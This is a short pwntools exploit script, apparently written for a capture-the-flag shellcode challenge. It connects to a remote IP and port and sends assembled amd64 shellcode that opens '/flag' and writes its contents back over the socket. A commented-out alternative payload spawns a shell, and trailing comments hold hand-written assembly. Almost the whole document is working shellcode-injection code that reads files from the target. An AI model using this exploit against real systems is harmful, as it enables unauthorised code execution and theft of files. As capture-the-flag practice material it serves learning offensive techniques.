from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

HOST, PORT = "109.233.56.90", 11613

io = remote(HOST, PORT)
context.arch = 'amd64'
context.os = 'linux'


#io.recvuntil(b"5h3llC0d3, dud3zz?")


#payload = asm(shellcraft.amd64.linux.sh())
FLAG = "/flag"  # поправь, если путь другой

src = shellcraft.pushstr(FLAG)
src += shellcraft.openat(constants.AT_FDCWD, 'rsp', 0, 0)
src += 'mov r10, rax\n'
src += shellcraft.sendfile(1, 'r10', 0, 0x100)
src += shellcraft.exit(0)
src = asm(src)
io.send(src.ljust(0x400, b"\x00"))
io.interactive()
#
#
# BIT 64
#
# and rsp, 0xFFFFFFFFFFFFFFF0
# mov rdi, 0xCOFEBABE
# mov rsi, 128
# mov rdx, 127
# mov rcx, 0
# mov r8, -1
# mov rax, 0x4006B0
#
# call rax
